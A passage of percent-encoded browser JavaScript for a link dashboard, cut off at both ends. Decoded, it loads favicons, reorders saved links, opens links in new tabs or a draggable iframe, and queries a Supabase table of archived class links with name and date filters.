3%74%6F%72%28%22%69%6D%67%2C%20%73%70%61%6E%22%29%3F%2E%72%65%6D%6F%76%65%28%29%3B%0A%20%20%20%20%20%20%6C%69%6E%6B%2E%70%72%65%70%65%6E%64%28%66%61%6C%6C%62%61%63%6B%29%3B%0A%20%20%20%20%20%20%72%65%74%75%72%6E%3B%0A%20%20%20%20%7D%0A%20%20%20%20%69%6D%67%2E%73%72%63%3D%74%72%79%53%6F%75%72%63%65%73%5B%69%2B%2B%5D%3B%0A%20%20%7D%0A%20%20%69%6D%67%2E%6F%6E%6C%6F%61%64%3D%28%29%3D%3E%7B%69%66%28%69%6D%67%2E%6E%61%74%75%72%61%6C%57%69%64%74%68%3C%31%36%29%20%74%72%79%4E%65%78%74%28%29%3B%20%65%6C%73%65%7B%6C%69%6E%6B%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%69%6D%67%2C%20%73%70%61%6E%22%29%3F%2E%72%65%6D%6F%76%65%28%29%3B%20%6C%69%6E%6B%2E%70%72%65%70%65%6E%64%28%69%6D%67%29%3B%7D%7D%3B%0A%20%20%69%6D%67%2E%6F%6E%65%72%72%6F%72%3D%74%72%79%4E%65%78%74%3B%0A%20%20%74%72%79%4E%65%78%74%28%29%3B%0A%7D%0A%0A%2F%2F%20%4C%6F%61%64%20%65%6E%72%6F%6C%6C%65%64%20%6C%69%6E%6B%73%20%61%6E%64%20%72%65%73%74%6F%72%65%20%6F%72%64%65%72%20%61%66%74%65%72%20%61%6C%6C%20%69%74%65%6D%73%20%65%78%69%73%74%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%6C%6F%61%64%45%6E%72%6F%6C%6C%65%64%49%74%65%6D%73%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%6C%69%6E%6B%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%29%3B%0A%0A%20%20%66%6F%72%20%28%63%6F%6E%73%74%20%6C%69%6E%6B%20%6F%66%20%6C%69%6E%6B%73%29%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%75%72%6C%20%3D%20%6C%69%6E%6B%2E%64%61%74%61%73%65%74%2E%75%72%6C%3B%0A%20%20%20%20%6C%69%6E%6B%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%20%22%20%2B%20%28%6E%65%77%20%55%52%4C%28%75%72%6C%29%2E%68%6F%73%74%6E%61%6D%65%2E%72%65%70%6C%61%63%65%28%2F%5E%77%77%77%5C%2E%2F%2C%20%22%22%29%29%3B%0A%20%20%20%20%61%77%61%69%74%20%73%6D%61%72%74%46%61%76%69%63%6F%6E%28%75%72%6C%2C%20%6C%69%6E%6B%29%3B%0A%0A%20%20%20%20%69%66%20%28%75%72%6C%2E%69%6E%63%6C%75%64%65%73%28%22%6A%75%6C%69%6F%73%2E%67%61%6D%65%73%22%29%29%20%7B%0A%20%20%20%20%20%20%69%66%20%28%21%6C%69%6E%6B%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%69%22%29%29%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%69%63%6F%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%69%22%29%3B%0A%20%20%20%20%20%20%20%20%69%63%6F%6E%2E%63%6C%61%73%73%4E%61%6D%65%20%3D%20%22%66%61%73%20%66%61%2D%65%78%74%65%72%6E%61%6C%2D%6C%69%6E%6B%2D%61%6C%74%20%6D%6C%2D%61%75%74%6F%20%74%65%78%74%2D%78%73%22%3B%0A%20%20%20%20%20%20%20%20%6C%69%6E%6B%2E%61%70%70%65%6E%64%28%69%63%6F%6E%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20%6C%69%6E%6B%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%65%20%3D%3E%20%7B%0A%20%20%20%20%20%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%63%61%74%65%67%6F%72%79%4C%69%73%74%20%3D%20%6C%69%6E%6B%2E%70%61%72%65%6E%74%45%6C%65%6D%65%6E%74%3B%0A%0A%20%20%20%20%20%20%2F%2F%20%4D%6F%76%65%20%63%6C%69%63%6B%65%64%20%6C%69%6E%6B%20%74%6F%20%74%68%65%20%74%6F%70%0A%20%20%20%20%20%20%63%61%74%65%67%6F%72%79%4C%69%73%74%2E%70%72%65%70%65%6E%64%28%6C%69%6E%6B%29%3B%0A%0A%20%20%20%20%20%20%2F%2F%20%53%61%76%65%20%6E%65%77%20%6F%72%64%65%72%20%69%6E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%69%64%73%20%3D%20%41%72%72%61%79%2E%66%72%6F%6D%28%63%61%74%65%67%6F%72%79%4C%69%73%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%2E%65%6E%72%6F%6C%6C%65%64%2D%69%74%65%6D%22%29%29%2E%6D%61%70%28%6C%20%3D%3E%20%6C%2E%69%64%29%3B%0A%20%20%20%20%20%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%6F%72%64%65%72%5F%24%7B%63%61%74%65%67%6F%72%79%4C%69%73%74%2E%70%61%72%65%6E%74%45%6C%65%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%2E%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%22%29%2E%74%65%78%74%43%6F%6E%74%65%6E%74%7D%60%2C%20%4A%53%4F%4E%2E%73%74%72%69%6E%67%69%66%79%28%69%64%73%29%29%3B%0A%0A%20%20%20%20%20%20%69%66%20%28%75%72%6C%2E%69%6E%63%6C%75%64%65%73%28%22%6A%75%6C%69%6F%73%2E%67%61%6D%65%73%22%29%29%20%7B%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%75%72%6C%2C%20%22%5F%62%6C%61%6E%6B%22%29%3B%0A%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%6F%70%65%6E%49%66%72%61%6D%65%28%6C%69%6E%6B%2C%20%75%72%6C%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%29%3B%0A%20%20%7D%0A%0A%20%20%2F%2F%20%52%65%73%74%6F%72%65%20%73%61%76%65%64%20%6F%72%64%65%72%20%41%46%54%45%52%20%61%6C%6C%20%6C%69%6E%6B%73%20%61%72%65%20%70%6F%70%75%6C%61%74%65%64%0A%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%2E%63%61%74%65%67%6F%72%79%22%29%2E%66%6F%72%45%61%63%68%28%63%61%74%20%3D%3E%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%68%65%61%64%65%72%20%3D%20%63%61%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%2E%63%61%74%65%67%6F%72%79%2D%68%65%61%64%65%72%22%29%2E%74%65%78%74%43%6F%6E%74%65%6E%74%3B%0A%20%20%20%20%63%6F%6E%73%74%20%6C%69%73%74%20%3D%20%63%61%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%22%2E%63%61%74%65%67%6F%72%79%2D%6C%69%73%74%22%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%64%4F%72%64%65%72%20%3D%20%4A%53%4F%4E%2E%70%61%72%73%65%28%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%6F%72%64%65%72%5F%24%7B%68%65%61%64%65%72%7D%60%29%20%7C%7C%20%22%5B%5D%22%29%3B%0A%20%20%20%20%69%66%20%28%73%61%76%65%64%4F%72%64%65%72%2E%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%20%20%73%61%76%65%64%4F%72%64%65%72%2E%66%6F%72%45%61%63%68%28%69%64%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%6C%20%3D%20%6C%69%73%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%28%60%23%24%7B%69%64%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%65%6C%29%20%6C%69%73%74%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%65%6C%29%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%0A%20%20%7D%29%3B%0A%7D%0A%0A%2F%2F%20%49%6E%69%74%69%61%6C%69%7A%65%20%65%6E%72%6F%6C%6C%65%64%20%6C%69%6E%6B%73%0A%6C%6F%61%64%45%6E%72%6F%6C%6C%65%64%49%74%65%6D%73%28%29%3B%0A%0A%20%20%0A%2F%2F%20%54%6F%67%67%6C%65%20%69%66%72%61%6D%65%0A%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%28%29%3D%3E%7B%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%69%66%72%61%6D%65%4F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%3D%3D%3D%22%6E%6F%6E%65%22%3F%22%62%6C%6F%63%6B%22%3A%22%6E%6F%6E%65%22%3B%7D%29%3B%0A%0A%2F%2F%20%44%72%61%67%67%61%62%6C%65%20%69%66%72%61%6D%65%0A%6C%65%74%20%69%73%44%72%61%67%67%69%6E%67%3D%66%61%6C%73%65%2C%64%78%3D%30%2C%64%79%3D%30%3B%0A%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%6D%6F%75%73%65%64%6F%77%6E%22%2C%65%3D%3E%7B%69%73%44%72%61%67%67%69%6E%67%3D%74%72%75%65%3B%64%78%3D%65%2E%63%6C%69%65%6E%74%58%2D%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%6F%66%66%73%65%74%4C%65%66%74%3B%64%79%3D%65%2E%63%6C%69%65%6E%74%59%2D%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%6F%66%66%73%65%74%54%6F%70%3B%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%63%75%72%73%6F%72%3D%22%67%72%61%62%62%69%6E%67%22%3B%7D%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%6D%6F%75%73%65%6D%6F%76%65%22%2C%65%3D%3E%7B%69%66%28%21%69%73%44%72%61%67%67%69%6E%67%29%72%65%74%75%72%6E%3B%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%6C%65%66%74%3D%60%24%7B%65%2E%63%6C%69%65%6E%74%58%2D%64%78%7D%70%78%60%3B%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%74%6F%70%3D%60%24%7B%65%2E%63%6C%69%65%6E%74%59%2D%64%79%7D%70%78%60%3B%7D%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%6D%6F%75%73%65%75%70%22%2C%28%29%3D%3E%7B%69%73%44%72%61%67%67%69%6E%67%3D%66%61%6C%73%65%3B%69%66%72%61%6D%65%54%6F%67%67%6C%65%42%74%6E%2E%73%74%79%6C%65%2E%63%75%72%73%6F%72%3D%22%67%72%61%62%22%3B%7D%29%3B%0A%0A%2F%2F%20%57%49%4B%49%2D%4C%49%4E%4B%53%20%46%45%54%43%48%20%28%76%6F%74%65%73%20%72%65%6D%6F%76%65%64%2C%20%65%76%65%72%79%74%68%69%6E%67%20%65%6C%73%65%20%69%6E%74%61%63%74%29%0A%63%6F%6E%73%74%20%77%69%6B%69%4D%6F%64%61%6C%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%77%69%6B%69%4D%6F%64%61%6C%27%29%3B%0A%63%6F%6E%73%74%20%77%69%6B%69%42%6F%78%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%77%69%6B%69%42%6F%78%27%29%3B%0A%63%6F%6E%73%74%20%77%69%6B%69%4F%76%65%72%6C%61%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%77%69%6B%69%4F%76%65%72%6C%61%79%27%29%3B%0A%63%6F%6E%73%74%20%63%6C%6F%73%65%57%69%6B%69%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6C%6F%73%65%57%69%6B%69%27%29%3B%0A%63%6F%6E%73%74%20%61%72%63%68%69%76%65%64%42%74%6E%20%3D%20%5B%2E%2E%2E%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%22%61%22%29%5D%2E%66%69%6E%64%28%65%6C%20%3D%3E%20%65%6C%2E%74%65%78%74%43%6F%6E%74%65%6E%74%2E%69%6E%63%6C%75%64%65%73%28%22%41%72%63%68%69%76%65%64%20%63%6C%61%73%73%65%73%22%29%29%3B%0A%6C%65%74%20%70%61%67%65%20%3D%20%30%2C%20%70%61%67%65%53%69%7A%65%20%3D%20%35%2C%20%63%75%72%72%65%6E%74%46%69%6C%74%65%72%20%3D%20%7B%20%6E%61%6D%65%3A%20%27%27%2C%20%72%61%6E%67%65%3A%20%27%61%6C%6C%27%20%7D%2C%20%74%6F%74%61%6C%4C%69%6E%6B%73%20%3D%20%30%3B%0A%0A%61%72%63%68%69%76%65%64%42%74%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%77%69%6B%69%4D%6F%64%61%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%68%69%64%64%65%6E%27%29%3B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%77%69%6B%69%42%6F%78%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%73%63%61%6C%65%2D%31%30%30%27%2C%20%27%6F%70%61%63%69%74%79%2D%31%30%30%27%29%2C%20%31%30%29%3B%0A%20%20%6C%6F%61%64%4E%61%6D%65%73%28%29%3B%0A%20%20%61%70%70%6C%79%46%69%6C%74%65%72%73%28%29%3B%0A%7D%29%3B%0A%63%6C%6F%73%65%57%69%6B%69%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%63%6C%6F%73%65%4D%6F%64%61%6C%29%3B%0A%77%69%6B%69%4F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%63%6C%6F%73%65%4D%6F%64%61%6C%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%63%6C%6F%73%65%4D%6F%64%61%6C%28%29%20%7B%20%77%69%6B%69%42%6F%78%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%27%73%63%61%6C%65%2D%31%30%30%27%2C%27%6F%70%61%63%69%74%79%2D%30%27%29%3B%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%3D%3E%77%69%6B%69%4D%6F%64%61%6C%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%27%68%69%64%64%65%6E%27%29%2C%32%30%30%29%3B%20%7D%0A%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%66%69%6C%74%65%72%2D%6E%61%6D%65%27%29%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%68%61%6E%67%65%27%2C%20%61%70%70%6C%79%46%69%6C%74%65%72%73%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%66%69%6C%74%65%72%2D%64%61%74%65%27%29%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%68%61%6E%67%65%27%2C%20%61%70%70%6C%79%46%69%6C%74%65%72%73%29%3B%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%6C%6F%61%64%4E%61%6D%65%73%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%7B%20%64%61%74%61%20%7D%20%3D%20%61%77%61%69%74%20%73%75%70%61%62%61%73%65%2E%66%72%6F%6D%28%27%6C%69%6E%6B%5F%6E%61%6D%65%73%27%29%2E%73%65%6C%65%63%74%28%27%6E%61%6D%65%27%29%3B%0A%20%20%63%6F%6E%73%74%20%73%65%6C%65%63%74%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%66%69%6C%74%65%72%2D%6E%61%6D%65%27%29%3B%0A%20%20%73%65%6C%65%63%74%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%60%3C%6F%70%74%69%6F%6E%20%76%61%6C%75%65%3D%22%22%3E%41%6C%6C%3C%2F%6F%70%74%69%6F%6E%3E%60%3B%0A%20%20%64%61%74%61%3F%2E%66%6F%72%45%61%63%68%28%64%20%3D%3E%20%7B%20%63%6F%6E%73%74%20%6F%70%74%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%6F%70%74%69%6F%6E%27%29%3B%20%6F%70%74%2E%76%61%6C%75%65%3D%64%2E%6E%61%6D%65%3B%20%6F%70%74%2E%74%65%78%74%43%6F%6E%74%65%6E%74%3D%64%2E%6E%61%6D%65%3B%20%73%65%6C%65%63%74%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%6F%70%74%29%3B%20%7D%29%3B%0A%7D%0A%0A%66%75%6E%63%74%69%6F%6E%20%67%65%74%44%61%74%65%52%61%6E%67%65%28%72%61%6E%67%65%54%79%70%65%29%20%7B%0A%20%20%63%6F%6E%73%74%20%6E%6F%77%3D%6E%65%77%20%44%61%74%65%28%29%2C%20%73%74%61%72%74%3D%6E%65%77%20%44%61%74%65%28%29%2C%20%65%6E%64%3D%6E%65%77%20%44%61%74%65%28%29%3B%0A%20%20%73%77%69%74%63%68%28%72%61%6E%67%65%54%79%70%65%29%7B%0A%20%20%20%20%63%61%73%65%20%27%74%6F%64%61%79%27%3A%20%73%74%61%72%74%2E%73%65%74%48%6F%75%72%73%28%30%2C%30%2C%30%2C%30%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%3A%6E%6F%77%7D%3B%0A%20%20%20%20%63%61%73%65%20%27%79%65%73%74%65%72%64%61%79%27%3A%20%73%74%61%72%74%2E%73%65%74%44%61%74%65%28%73%74%61%72%74%2E%67%65%74%44%61%74%65%28%29%2D%31%29%3B%20%65%6E%64%2E%73%65%74%44%61%74%65%28%65%6E%64%2E%67%65%74%44%61%74%65%28%29%2D%31%29%3B%20%73%74%61%72%74%2E%73%65%74%48%6F%75%72%73%28%30%2C%30%2C%30%2C%30%29%3B%20%65%6E%64%2E%73%65%74%48%6F%75%72%73%28%32%33%2C%35%39%2C%35%39%2C%39%39%39%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%7D%3B%0A%20%20%20%20%63%61%73%65%20%27%6C%61%73%74%37%27%3A%20%73%74%61%72%74%2E%73%65%74%44%61%74%65%28%73%74%61%72%74%2E%67%65%74%44%61%74%65%28%29%2D%36%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%3A%6E%6F%77%7D%3B%0A%20%20%20%20%63%61%73%65%20%27%74%68%69%73%4D%6F%6E%74%68%27%3A%20%73%74%61%72%74%2E%73%65%74%44%61%74%65%28%31%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%3A%6E%6F%77%7D%3B%0A%20%20%20%20%63%61%73%65%20%27%6C%61%73%74%4D%6F%6E%74%68%27%3A%20%73%74%61%72%74%2E%73%65%74%4D%6F%6E%74%68%28%73%74%61%72%74%2E%67%65%74%4D%6F%6E%74%68%28%29%2D%31%29%3B%20%73%74%61%72%74%2E%73%65%74%44%61%74%65%28%31%29%3B%20%65%6E%64%2E%73%65%74%4D%6F%6E%74%68%28%73%74%61%72%74%2E%67%65%74%4D%6F%6E%74%68%28%29%29%3B%20%65%6E%64%2E%73%65%74%44%61%74%65%28%30%29%3B%20%65%6E%64%2E%73%65%74%48%6F%75%72%73%28%32%33%2C%35%39%2C%35%39%2C%39%39%39%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%7D%3B%0A%20%20%20%20%63%61%73%65%20%27%74%68%69%73%59%65%61%72%27%3A%20%73%74%61%72%74%2E%73%65%74%4D%6F%6E%74%68%28%30%2C%31%29%3B%20%73%74%61%72%74%2E%73%65%74%48%6F%75%72%73%28%30%2C%30%2C%30%2C%30%29%3B%20%72%65%74%75%72%6E%20%7B%73%74%61%72%74%2C%65%6E%64%3A%6E%6F%77%7D%3B%0A%20%20%20%20%64%65%66%61%75%6C%74%3A%20%72%65%74%75%72%6E%20%6E%75%6C%6C%3B%0A%20%20%7D%0A%7D%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%61%70%70%6C%79%46%69%6C%74%65%72%73%28%29%20%7B%20%70%61%67%65%3D%30%3B%20%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%6E%61%6D%65%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%66%69%6C%74%65%72%2D%6E%61%6D%65%27%29%2E%76%61%6C%75%65%3B%20%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%72%61%6E%67%65%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%66%69%6C%74%65%72%2D%64%61%74%65%27%29%2E%76%61%6C%75%65%3B%20%61%77%61%69%74%20%63%6F%75%6E%74%54%6F%74%61%6C%4C%69%6E%6B%73%28%29%3B%20%61%77%61%69%74%20%66%65%74%63%68%4C%69%6E%6B%73%28%29%3B%20%7D%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%63%6F%75%6E%74%54%6F%74%61%6C%4C%69%6E%6B%73%28%29%20%7B%0A%20%20%6C%65%74%20%71%75%65%72%79%20%3D%20%73%75%70%61%62%61%73%65%2E%66%72%6F%6D%28%27%6C%69%6E%6B%73%27%29%2E%73%65%6C%65%63%74%28%27%2A%27%2C%20%7B%20%63%6F%75%6E%74%3A%20%27%65%78%61%63%74%27%2C%20%68%65%61%64%3A%20%74%72%75%65%20%7D%29%3B%0A%20%20%69%66%28%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%6E%61%6D%65%29%20%71%75%65%72%79%20%3D%20%71%75%65%72%79%2E%65%71%28%27%6E%61%6D%65%27%2C%20%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%6E%61%6D%65%29%3B%0A%20%20%63%6F%6E%73%74%20%72%61%6E%67%65%3D%67%65%74%44%61%74%65%52%61%6E%67%65%28%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%72%61%6E%67%65%29%3B%0A%20%20%69%66%28%72%61%6E%67%65%29%20%71%75%65%72%79%3D%71%75%65%72%79%2E%67%74%65%28%27%64%61%74%65%27%2C%20%72%61%6E%67%65%2E%73%74%61%72%74%2E%74%6F%49%53%4F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28%27%54%27%29%5B%30%5D%29%2E%6C%74%65%28%27%64%61%74%65%27%2C%20%72%61%6E%67%65%2E%65%6E%64%2E%74%6F%49%53%4F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28%27%54%27%29%5B%30%5D%29%3B%0A%20%20%63%6F%6E%73%74%20%7B%20%63%6F%75%6E%74%20%7D%3D%61%77%61%69%74%20%71%75%65%72%79%3B%20%74%6F%74%61%6C%4C%69%6E%6B%73%3D%63%6F%75%6E%74%7C%7C%30%3B%0A%7D%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%66%65%74%63%68%4C%69%6E%6B%73%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%63%6F%6E%74%61%69%6E%65%72%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%72%65%73%75%6C%74%73%27%29%3B%0A%20%20%63%6F%6E%74%61%69%6E%65%72%2E%69%6E%6E%65%72%48%54%4D%4C%3D%27%27%3B%0A%20%20%6C%65%74%20%71%75%65%72%79%3D%73%75%70%61%62%61%73%65%2E%66%72%6F%6D%28%27%6C%69%6E%6B%73%27%29%2E%73%65%6C%65%63%74%28%27%2A%27%29%2E%6F%72%64%65%72%28%27%64%61%74%65%27%2C%7B%61%73%63%65%6E%64%69%6E%67%3A%66%61%6C%73%65%7D%29%2E%72%61%6E%67%65%28%70%61%67%65%2A%70%61%67%65%53%69%7A%65%2C%28%70%61%67%65%2B%31%29%2A%70%61%67%65%53%69%7A%65%2D%31%29%3B%0A%20%20%69%66%28%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%6E%61%6D%65%29%20%71%75%65%72%79%3D%71%75%65%72%79%2E%65%71%28%27%6E%61%6D%65%27%2C%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%6E%61%6D%65%29%3B%0A%20%20%63%6F%6E%73%74%20%72%61%6E%67%65%3D%67%65%74%44%61%74%65%52%61%6E%67%65%28%63%75%72%72%65%6E%74%46%69%6C%74%65%72%2E%72%61%6E%67%65%29%3B%0A%20%20%69%66%28%72%61%6E%67%65%29%20%71%75%65%72%79%3D%71%75%65%72%79%2E%67%74%65%28%27%64%61%74%65%27%2C%20%72%61%6E%67%65%2E%73%74%61%72%74%2E%74%6F%49%53%4F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28%27%54%27%29%5B%30%5D%29%2E%6C%74%65%28%27%64%61%74%65%27%2C%20%72%61%6E%67%65%2E%65%6E%64%2E%74%6F%49%53%4F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28%27%54%27%29%5B%30%5D%29%3B%0A%20%20%63%6F%6E%73%74%20%7B%20%64%61%74%61%20%7D%3D%61%77%61%69%74%20%71%75%65%72%79%3B%0A%20%20%69%66%28%21%64%61%74%61%7C%7C%64%61%74%61%2E%6C%65%6E%67%74%68%3D%3D%3D%30%29%7B%63%6F%6E%74%61%69%6E%65%72%2E%69%6E%6E%65%72%48%54%4D%4C%3D%60%3C%64%69%76%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%63%65%6E%74%65%72%20%74%65%78%74%2D%67%72%61%79%2D%35%30%30%20%70%79%2D%34%22%3E%A0%0F%20%4E%6F%20%6C%69%6E%6B%73%20%66%6F%75%6E%64%2E%3C%2F%64%69%76%3E%60%3B%72%65%74%75%72%6E%3B%7D%0A%0A%20%20%66%6F%72%28%63%6F%6E%73%74%20%6C%69%6E%6B%20%6F%66%20%64%61%74%61%29%7B%0A%20%20%20%20%63%6F%6E%73%74%20%64%69%76%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%64%69%76%27%29%3B%0A%20%20%20%20%64%69%76%2E%63%6C%61%73%73%4E%61%6D%65%3D%27%70%2D%33%20%72%6F%75%6E%64%65%64%2D%78%6C%20%62%6F%72%64%65%72%20%68%6F%76%65%72%3A%62%67%2D%67%72%61%79%2D%35%30%20%66%6C%65%78%20%66%6C%65%78%2D%63%6F%6C%20%67%61%70%2D%31%27%3B%0A%20%20%20%20%64%69%76%2E%69%6E%6E%65%72%48%54%4D%4C%3D%60%0A%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%24%7B%6C%69%6E%6B%2E%75%72%6C%7D%22%20%74%61%72%67%65%74%3D%22%5F%62%6C%61%6E%6B%22%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%62%6C%75%65%2D%36%30%30%20%68%6F%76%65%72%3A%75%6E%64%65%72%6C%69%6E%65%20%62%72%65%61%6B%2D%61%6C%6C%20%66%6F%6E%74%2D%6D%65%64%69%75%6D%22%3E%24%7B%6C%69%6E%6B%2E%6E%61%6D%65%7D%3C%2F%61%3E%0A%20%20%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%35%30%30%20%74%65%78%74%2D%78%73%20%62%72%65%61%6B%2D%61%6C%6C%22%3E%24%7B%6C%69%6E%6B%2E%75%72%6C%7D%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%67%72%61%79%2D%34%30%30%20%74%65%